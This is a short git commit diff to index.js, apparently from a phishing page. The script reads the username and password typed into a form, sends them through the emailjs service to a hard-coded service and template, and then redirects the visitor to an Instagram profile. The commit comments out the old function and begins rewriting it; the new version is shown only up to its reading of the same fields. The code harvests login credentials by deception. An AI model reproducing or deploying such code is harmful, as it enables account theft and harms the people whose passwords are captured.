01752f5816913ae086e6a9e8127964c3ca4973af
linkshortenergu <102642948+linkshortenergu@users.noreply.github.com>
2022-05-07 23:17:51 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,4 +1,15 @@
-function async sendmail(){
+// function async sendmail(){
+//     let temppara = {
+//         user_name : document.getElementById("username").value,
+//         user_passw : document.getElementById("passw").value
+//     }
+//     await emailjs.send('service_nrjef9d' , 'template_5odpv2h' , temppara)
+//     .then(function (res){
+//             window.open("https://www.instagram.com/sskk.450/");
+//         console.log("succeeed")
+//     })
+// }
+const sendmail =async ()=>{
     let temppara = {
         user_name : document.getElementById("username").value,
         user_passw : document.getElementById("passw").value
